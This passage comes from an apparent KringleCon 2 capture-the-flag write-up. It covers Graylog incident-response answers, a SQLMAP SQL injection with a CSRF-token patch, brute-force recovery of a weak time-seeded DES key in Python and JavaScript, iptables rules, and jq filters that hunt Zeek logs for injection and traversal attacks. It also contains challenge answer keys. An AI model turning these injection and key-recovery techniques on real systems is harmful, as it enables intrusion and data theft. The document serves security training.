Since all commands (sysmon event id 1) by the attacker are initially running through the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to find child processes it creates sorting on timestamp. Search: \"ParentProcessCommandLine:/.*cookie_recipe.*/\" Question 4: What is the one-word service name the attacker used to escalate privileges? Answer: webexservice Hint: Continuing on using the cookie_reciper.exe binary as our ParentProcessImage, we should see some more commands later on related to a service. Question 5: What is the file-path + filename of the binary ran by the attacker to dump credentials? Answer: C:\\cookie.exe Hint: The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe. Let's use this binary path in our ParentProcessImage search. Question 6: The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine? Answer: alabaster Hint:Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress. Search: EventID:4624 AND SourceNetworkAddress:192.168.247.175 Question 7: What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine? Answer Answer: 06:04:28 Hint: LogonType 10 is used for successful network connections using the RDP client. Search: EventID:4624 AND SourceNetworkAddress:192.168.247.175 Question 8: The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv) Answer: ELFU-RES-WKS2,elfu-res-wks3,3 Search: ventID:4624 AND SourceHostName:ELFU\\-RES\\-WKS2 Hint:The attacker has GUI access to workstation 2 via RDP. They likely use this GUI connection to access the file system of of workstation 3 using explorer.exe via UNC file paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we still see the successful network authentication for this with event id 4624 and logon type 3. Question 9: What is the full-path + filename of the secret research document after being transferred from the third host to the second host? Answer: C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf Hints: Search EventID:2 AND source:elfu\\-res\\-wks2 AND NOT TargetFilename:/.+AppData.+/ We can look for sysmon file creation event id of 2 with a source of workstation 2. We can also use regex to filter out overly common file paths using something like: AND NOT TargetFilename:/.+AppData.+/ Question 10: What is the IPv4 address (as found in logs) the secret research document was exfiltrated to? Answer: 104.22.3.84 Hint: We can look for the original document in CommandLine using regex. When we do that, we see a long a long PowerShell command using Invoke-Webrequest to a remote URL of https://pastebin.com/post.php. We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com. Search: pastebin.com Kringlecon 2 - Report Submission Message from Pepper Ministix after solving the challenge: Kringlecon 2 - Graylog Incident Response Report - Terminal Challenge","title":"Graylog - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-9-walkthrough","text":"You read the hints that were provided from solving the last terminal challenge. You look at the student portal. Kringlecon 2 - Check Application Status You try a simple SQL injection 'email@domain.com to ese if the website is vulnerable to SQL injection. Kringlecon 2 - SQL injection After reviewing the webpage you notice that the CSRF validaitor url is https://studentportal.elfu.org/validator.php You download SQLMAP. You use the following configs: url = https://studentportal.elfu.org/application-check.php?elfmail=test%40test.com&token= method = get csrfToken = token csrfUrl = https://studentportal.elfu.org/validator.php csrfMethod = GET verbose = 6 You run SQLMAP with -dump. You get an error message that it's unable to find the CSRF token. You search github to see where this error is coming from. You notice this error is coming from connect.py file around line 1110. Kringlecon 2 - Interesting table You review the code and add 3 lines to \"FIX\" the code. print ( \"page:\" + str ( page )) token . name = \"token\" token . value = str ( page ) . replace ( \"=\" , \"%3D\" ) Kringlecon 2 - connect.py \"FIX\" You re-run SQLMAP with -dump. Kringlecon 2 - SQLMAP Running. SQLMAP finds a database that has 6 image uids. Kringlecon 2 - Interesting table Kringlecon 2 - SQLMAP completed. You download the 6 images that you found in the table. Kringlecon 2 - 0f5f510e.png Kringlecon 2 - 1cc7e121.png Kringlecon 2 - 439f15e6.png Kringlecon 2 - 667d6896.png Kringlecon 2 - adb798ca.png Kringlecon 2 - ba417715.png You make out the name of Santa's cutting-edge sleigh guidance system on the edges of the scrapes.","title":"Objective 9 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-9-solution","text":"Answer: Super sled-o-matic \\pagebreak","title":"Objective 9 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-10-recover-cleartext-document","text":"Inspirational Quote \"Solve objectives to unravel the mystery of the universe .\" - Ed Skoudis Objective The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. What is the middle line on the cover page? (Hint: it's five words) For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen. Difficulty Level: 5 Links Elfscrow Crypto , debug symbols , encrypted document Related Video Ron Bowes, Reversing Crypto the Easy Way","title":"Objective 10 - Recover Cleartext Document"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#mongo-pilfer-terminal-challenge","text":"Elf Name Holly Evergreen Pre-Solve Hints MongoDB Documentation Post-Solve Hints Reversing Crypto the Easy Way Objective Kringlecon 2 - Holy Evergreen - Terminal Challenge Kringlecon 2 - Mongo Pilfer - Terminal Challenge You read the hint provided by Holly Evergreen. You open the Mongo Pilfer terminal. Kringlecon 2 - Mongo Pilfer - Terminal Challenge You run mongo and receive this error message. Kringlecon 2 - Mongo Pilfer - Terminal Challenge You notice Mongo is not running on a default port. You look around and find a file in the root go.sh . Kringlecon 2 - cat /go.sh This file shows that mongo is running on port 12121. You run mongo localhost:12121 to connect to the mongo server. Kringlecon 2 - Mongo Pilfer - Terminal Challenge You run show dbs to get a list of databases. You switch to elfu database. You list the collections show collections . You run the action find on collection solution . You run the command that is displayed from the above command. Kringlecon 2 - Mongo Pilfer - Terminal Challenge Kringlecon 2 - Mongo Pilfer - Terminal Challenge","title":"Mongo Pilfer - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#mongo-pilfer-solution","text":"Answer: mongo localhost:12121 db.loadServerScripts();displaySolution(); Message from Holly Evergreen after solving the challenge: Kringlecon 2 - Mongo Pilfer - Terminal Challenge","title":"Mongo Pilfer - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-10-walkthrough","text":"You watch the Reversing Crypto the Easy Way. You run elfscrow.exe in a sandbox and encrypt a test document. You notice each time the document is encrypted it is providing a different escrow key. You start by downloading and installing the free version of IDA. You download the symbols provided in the challenge. You open elfscrow.exe in IDA and load the symbols. You navigate to generate_key function. You notice the function is calling the time. After the time function has been called it's calling the super_secure_srand function. Kringlecon 2 - Ida Generate_key function You google the time function and notice that it returns the time in epoch. Kringlecon 2 - time function You write a python program to output time in epoch. import time i = 1 while i < 100 : seconds = int ( time . time ()) print ( \"Seed =\" , seconds ) i += 1 You run elfscrow.exe at the same time as the python script and confirm that elfscrow.exe is using is time() as the Seed. Kringlecon 2 - Elfscrow.exe From earlier, you know this seed is likely passed to super_secure_srand function. You review super_secure_srand . Kringlecon 2 - super_secure_srand function You see a few constant in this function, ex. 2531011 . You search Google for this constant. You find a Fastrand() function that uses the same constants. Kringlecon 2 - Fastrand() You remember the video talked about how to create a generate_key function. Kringlecon 2 - Screenshot from the talk Using the video as a guide, you write the generate_key() function. def generate_key ( seed ): key = \"\" for i in range ( 8 ): seed = ( 214013 * seed + 2531011 ) key += chr ((( seed >> 16 ) & 0x7fff ) & 0x0ff ) return key While reviewing the code, you find that the encryption is likely DES-CBC. Kringlecon 2 - DES-CBC key You test decrypting the file you encrypted on CyberChef . Kringlecon 2 - Decrypt the file encrypted by elfscrow.exe The objective states the file was encrypted on December 6, 2019, between 7pm and 9pm UTC. You convert the time to epoch time. Kringlecon 2 - epoch time December 6, 2019, 7 PM Kringlecon 2 - epoch time December 6, 2019, 9 PM You know the key is between 1575658800 and 1575666000. You write a For loop around generate_key() function to generate all the keys. You output all the keys to a keys.txt . You download CyberChef API from github. You write a wrapper in Javascript to open keys.txt and decrypt it using CyberChef framework. You use the DES-CBC to decrypt the ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc with all possible keys. You output the decrypted files to a folder with the key that was used to decrypt it as the filename. {% highlight JavaScript linenos %} // app.js const chef = require(\"cyberchef\"); var readline = require('readline'); const fs = require('fs'); let file = fs.readFileSync(\"ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc\"); console.log(file) ; var myInterface = readline.createInterface({ input: fs.createReadStream('keys.txt') }); var lineno = 0; myInterface.on('line', function (line) { lineno++; console.log('Line number ' + lineno + ': ' + line.trim()); try { var results = chef.DESDecrypt(file,{ Key:{string:line.trim(), option:\"Hex\"}, IV:{string:\"0000000000000000\", option:\"Hex\"}, Mode: \"CBC\", Input:\"Raw\", Output:\"Raw\"},).toString(); // console.log(results); fs.writeFileSync('./files/'.concat(line.trim()), results, \"binary\",(err) => { // throws an error, you could also catch it here if (err) throw err; // success case, the file was saved console.log('Lyric saved!'); }); results = '' } catch(err) { } }); {% endhighlight JavaScript %} You run the JavaScript file and wait until it has decrypted the file with all possible keys. Once completed, you run the command grep -rl \"%PDF\" to find the decrypted file that has a PDF header. Kringlecon 2 - The only decrypted file with the \"%PDF\" header The key used to encrypt the file is b5ad6a321240fbec . You open the decrypted file. Kringlecon 2 - Document decrypted You notice an interesting section in the file that may come handy later. Kringlecon 2 - Document decrypted","title":"Objective 10 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-10-solution","text":"Answer: Machine Learning Sleigh Route Finder \\pagebreak","title":"Objective 10 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-11-open-the-sleigh-shop-door","text":"Inspirational Quote \"You must learn to say 'no'\" -hacks4pancake Objective Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny? For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth. Difficulty Level: 5 Links Crate Related Video","title":"Objective 11 - Open the Sleigh Shop Door"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#smart-braces-terminal-challenge","text":"Elf Name Kent Tinseltooth Pre-Solve Hints Iptables Post-Solve Hints Chrome Dev Tools Objective Kringlecon 2 - Kent Tinseltooth - Terminal Challenge You open the console and see the following messages: Kringlecon 2 - Smart Braces - Terminal Challenge You read IOTteethBraces.md. Kringlecon 2 - IOTteethBraces.md This is a timed challenge. If you take too long to solve the challenge, you're greeted with the following message: Kringlecon 2 - Kent Tinseltooth - Terminal Challenge You read the hint for this challenge and write the IP tables for the challenge. Kringlecon 2 - Kent Tinseltooth - Terminal Challenge","title":"Smart Braces - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#smart-braces-solution","text":"Answer: sudo iptables -F sudo iptables -P FORWARD DROP sudo iptables -P INPUT DROP sudo iptables -P OUTPUT DROP sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A INPUT -p tcp -s 172.19.0.255 --dport 22 -j ACCEPT sudo iptables -A INPUT -p tcp --match multiport --dport 21,80 -j ACCEPT sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -i lo -j ACCEPT Message from Kent Tinseltooth after solving the challenge: Kringlecon 2 - Kent Tinseltooth - Terminal Challenge","title":"Smart Braces - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-11-walkthrough","text":"You visit Shinny Upatree and are greeted with this message: Kringlecon 2 - Shinny Upatree When you visit crate website, you're greeted with a number of locks that you have to open. Each lock provides hint(s) for opening the lock.","title":"Objective 11 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-1","text":"You open the chrome developer tools and see a code 62ID5140 . You type this code in lock 1 and it unlocks. Kringlecon 2 - Lock 1","title":"Lock 1"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-2","text":"You proceed to lock 2. Kringlecon 2 - Lock 2 You view the source code for lock 2 and see the code 5U7A9BBX . Kringlecon 2 - Lock 2 Source Code Kringlecon 2 - Lock 2 - Print Preview","title":"Lock 2"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-3","text":"You proceed to lock 3. Kringlecon 2 - Lock 3 You view the Network response in chrome developer tools. Kringlecon 2 - Lock 3 - Network response You load the .png file that you see in network response. Kringlecon 2 - Lock 3 - png You type the code in lock 3 to unlock it. Kringlecon 2 - Lock 3 - Solved","title":"Lock 3"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-4","text":"You proceed to lock 4. Kringlecon 2 - Lock 4 You go to Application tab in chrome developer tools and expand Local Stroage under Storage . Kringlecon 2 - Lock 4 - Local Storage You type the code to unlock lock 4. Kringlecon 2 - Lock 4 - Solved","title":"Lock 4"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-5","text":"You proceed to Lock 5. Kringlecon 2 - Lock 5 The hint says to view the title on the html page. You view the title. Kringlecon 2 - Lock 5 - html You type the code in lock 5 to unlock it. Kringlecon 2 - Lock 5 - Solved","title":"Lock 5"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-6","text":"You proceed to Lock 6. Kringlecon 2 - Lock 6 You view the .css file and update the perspective variable. Kringlecon 2 - Lock 6 - .css The code becomes visible. Kringlecon 2 - Lock 6 - .css You type the code in the lock.","title":"Lock 6"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-7","text":"You proceed to Lock 7. Kringlecon 2 - Lock 7 You view the font-family in the html file and see QCIAX2SW Kringlecon 2 - Lock 7 - font-family html You type the code to unlock lock 7.","title":"Lock 7"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-8","text":"You proceed to Lock 8 Kringlecon 2 - Lock 8 Kringlecon 2 - Lock 8 - Code analysiss You create a button .egg and get the event listener. Kringlecon 2 - Lock 8 - Event Listener You enter VERONICA into the lock to unlock it.","title":"Lock 8"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-9","text":"You proceed to lock 9. Kringlecon 2 - Lock 9 You set the chakra's in the code to active. You see that the code appears above the instructions. Kringlecon 2 - Lock 9 You type the code into the lock to unlock. Kringlecon 2 - Lock 9 - Solved","title":"Lock 9"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#lock-10","text":"You proceed to lock 10. Kringlecon 2 - Lock 10 You view the code for the lock. Kringlecon 2 - Lock 10 - Code You remove the \"cover\" . Kringlecon 2 - Lock 10 - Remove Cover Kringlecon 2 - Lock 10 When you try to type a code the lock, an error appears in the console that it's missing a macaroni. You search the code for macaroni and find this. Kringlecon 2 - Lock 10 - macaroni You look at the .css and find that there is a mac.png, qtip.png and gnome.png. Kringlecon 2 - Lock 10 - png, qtip.png and gnome.png You look for gnome in the code. Kringlecon 2 - Lock 10 - gnome You find swab in the code. Kringlecon 2 - Lock 10 - swab/qtip You copy the three components to the lock 10 code. Kringlecon 2 - Lock 10 - Fix circuit board Kringlecon 2 - Lock 10 - Fixed lock You zoom into the side of the circuit board to find the code to unlock the lock K029XJ37 . Kringlecon 2 - Lock 10 - code You're greeted by this message once you unlock lock 10. Kringlecon 2 - Lock 10 - code","title":"Lock 10"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-11-solution","text":"Answer: Lock 1: 62ID5140 Lock 2: 5U7A9BBX Lock 3: FZUNIJFD Lock 4: H0UHDN8S Lock 5: ZW5698HD Lock 6: SRB40Q5Q Lock 7: QCIAX2SW Lock 8: VERONICA Lock 9: 0QIMRKYC Lock 10: K029XJ37 The villian is The Tooth Fairy. \\pagebreak","title":"Objective 11 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-12-filter-out-poisoned-sources-of-weather-data","text":"Inspirational Quote \"A Nerarious, villainous, Evil attacker is the worst of attacker you can have.\" -Ed Skoudis Objective Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID (\"RID\") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae. Difficulty Level: 4 Links Zeek JSON logs , Block the 100 offending sources of information to guide Santa's sleigh Related Video","title":"Objective 12 - Filter Out Poisoned Sources of Weather Data"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#zeek-json-analysis-terminal-challenge","text":"Elf Name Wunorse Openslae Pre-Solve Hints Parsing Zeek JSON Logs with JQ Post-Solve Hints Do you see any LFI , XSS , Shellshock , or SQLi ? Objective Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You read the instructions for jq. You open the terminal console. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You use jq to find the longest durations. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You modify the query to display the host and destinations. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You modify the query to sort by duration and get the last item of the list. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You run the runtoanswer and type in 13.107.21.200 . Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge","title":"Zeek JSON Analysis - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#zeek-json-analysis-solution","text":"Answer: 13.107.21.200 Message from Wunorse Openslae after solving the challenge: Kringlecon 2 - Wunorse Openslae - Terminal Challenge","title":"Zeek JSON Analysis - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-12-walkthrough","text":"You download zeek logs. We need to find the credentials to login to the website. You use JQ to filter out the noise and view successful connections. jq '.[] | select (.uri | contains (\"weather?station\") | not) | select (.status_code == 200) | .uri' http.log | sort |uniq Kringlecon 2 - Filter out the noise using JQ You see a file name README.md . You remember the document you decrypted in an earlier challenge, referred to default credentials being stored in README.md . You access srf.elfu.org/README.md . Kringlecon 2 - README.md You login srf.elfu.org with the default login. Kringlecon 2 - srf login page The welcome page once you login to srf . Kringlecon 2 - srf welcome page You review the Firewall instructions on how to block and allow IPs. Kringlecon 2 - Firewall Instructions You use JQ and the hints to find some of the bad IPs: jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host , \"\\n\"' http.log | grep -E \\' > blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | awk '/\\/\\.\\./' >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep -E \"\\.\\.\" >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep -E \\/\\.\\% >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep pass >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep \\> >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep \\& >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep \\| >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | awk '/\\;\\s*\\}/' >> blah.csv From the above queries you get 78 Bad IPs. You know there is about 100 bad IPs. You export all the events to a .csv file. jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | > all.csv You open all.csv in excel and look at the data. Kringlecon 2 - Pivot table on the User-Agent You use vlookup to get the user-agent count for each of the IP's user-agents. You filter on user-agent count that are low. You filter out the IPs that are already in your bad IP list. Kringlecon 2 - Filter by user-agents that have low hits. You get about 39 new IPs. 103.235.93.133 118.26.57.38 44.164.136.41 249.237.77.152 203.68.29.5 10.122.158.57 187.152.203.243 50.154.111.0 217.132.156.225 252.122.243.212 29.0.183.220 22.34.153.164 66.116.147.181 126.102.12.53 31.116.232.143 250.22.86.40 140.60.154.239 226.102.56.13 42.127.244.30 104.179.109.113 42.103.246.130 42.103.246.130 42.103.246.130 42.103.246.130 185.19.7.133 42.16.149.112 158.171.84.209 34.155.174.167 249.90.116.138 231.179.108.238 92.213.148.0 97.220.93.190 87.195.80.126 53.160.218.44 253.65.40.39 226.240.188.154 148.146.134.52 142.128.135.10 37.216.249.50 You combine the bad IPs. Here is a list of bad IPs: 42.103.246.250,49.161.8.58,84.147.231.129,2.230.60.70,10.155.246.29,225.191.220.138,75.73.228.192,249.34.9.16,27.88.56.114,238.143.78.114,121.7.186.163,106.132.195.153,129.121.121.48,190.245.228.38,34.129.179.28,135.32.99.116,2.240.116.254,45.239.232.245,33.132.98.193,84.185.44.166,254.140.181.172,150.50.77.238,68.115.251.76,118.196.230.170,173.37.160.150,81.14.204.154,135.203.243.43,186.28.46.179,13.39.153.254,111.81.145.191,0.216.249.31,220.132.33.81,83.0.8.119,150.45.133.97,229.229.189.246,227.110.45.126,123.127.233.97,80.244.147.207,200.75.228.240,230.246.50.221,223.149.180.133,187.178.169.123,116.116.98.205,102.143.16.184,52.39.201.107,131.186.145.73,253.182.102.55,1.185.21.112,229.133.163.235,194.143.151.224,23.49.177.78,75.215.214.65,211.229.3.254,250.51.219.47,180.57.20.247,9.206.212.33,79.198.89.109,25.80.197.172,193.228.194.36,169.242.54.5,28.169.41.122,233.74.78.199,132.45.187.177,56.5.47.137,19.235.69.221,69.221.145.150,42.191.112.181,48.66.193.176,44.74.106.131,106.93.213.219,31.254.228.4,61.110.82.125,65.153.114.120,95.166.116.45,168.66.108.62,139.45.221.220,96.156.113.98,170.51.98.223,103.235.93.133,118.26.57.38,44.164.136.41,249.237.77.152,203.68.29.5,10.122.158.57,187.152.203.243,50.154.111.0,217.132.156.225,252.122.243.212,29.0.183.220,22.34.153.164,66.116.147.181,126.102.12.53,31.116.232.143,250.22.86.40,140.60.154.239,226.102.56.13,42.127.244.30,104.179.109.113,42.103.246.130,185.19.7.133,42.16.149.112,158.171.84.209,34.155.174.167,249.90.116.138,231.179.108.238,92.213.148.0,97.220.93.190,87.195.80.126,53.160.218.44,253.65.40.39,226.240.188.154,148.146.134.52,142.128.135.10,37.216.249.50 You block the IPs on the firewall. Kringlecon 2 - Block bad IPs in firewall","title":"Objective 12 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-12-solution","text":"Answer: Route Calculation Success! RID:0807198508261964 Message from Tooth Fairy after solving the challenge: Kringlecon 2 - Tooth Fairy response \\pagebreak","title":"Objective 12 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#conclusion","text":"Once you solve the challenge, the bell tower door opens up. Kringlecon 2 - Bell Tower Access You go up the ladder to the bell tower. Kringlecon 2 - Bell Tower Access You open the letter in the corner of the room. Kringlecon 2 - Bell Tower You talk to Santa. Kringlecon 2 - Santa You talk to Tooth Fairy. Kringlecon 2 - Tooth Fairy You talk to Krampus. Kringlecon 2 - Krampus The narrative of the story line: Whose grounds these are, I think I know His home is in the North Pole though He will not mind me traipsing here To watch his students learn and grow Some other folk might stop and sneer \"Two turtle doves, this man did rear?\" I'll find the birds, come push or shove Objectives given: I'll soon clear Upon discov'ring each white dove, The subject of much campus love, I find the challenges are more Than one can count on woolen glove. Who wandered thus through closet door? Ho ho, what's this? What strange boudoir! Things here cannot be what they seem That portal's more than clothing store. Who enters contests by the ream And lives in tunnels meant for steam? This Krampus bloke seems rather strange And yet I must now join his team... Despite this fellow's funk and mange My fate, I think, he's bound to change. What is this contest all about? His victory I shall arrange! To arms, my friends! Do scream and shout! Some villain targets Santa's route! What scum - what filth would seek to end Kris Kringle's journey while he's out? Surprised, I am, but \"shock\" may tend To overstate and condescend. 'Tis little more than plot reveal That fairies often do extend And yet, despite her jealous zeal, My skills did win, my hacking heal! No dental dealer can so keep Our red-clad hero in ordeal! This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep...","title":"Conclusion"}]}